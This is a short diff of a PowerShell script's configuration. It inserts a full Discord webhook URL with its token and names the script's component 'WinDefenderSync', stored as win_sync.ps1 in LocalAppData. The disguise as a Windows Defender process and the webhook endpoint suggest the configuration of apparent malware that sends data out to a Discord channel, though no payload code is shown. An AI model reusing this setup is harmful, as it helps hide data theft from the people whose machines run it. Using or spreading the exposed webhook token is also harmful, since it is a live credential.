@@ -1,5 +1,5 @@
 # Configuration - YOU MUST REPLACE THIS WITH YOUR NEW URL
-$W = "YOUR_NEW_DISCORD_WEBHOOK_URL_HERE"
+$W = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX"
 $P = "WinDefenderSync"
 $F = "$env:LOCALAPPDATA\win_sync.ps1"
 
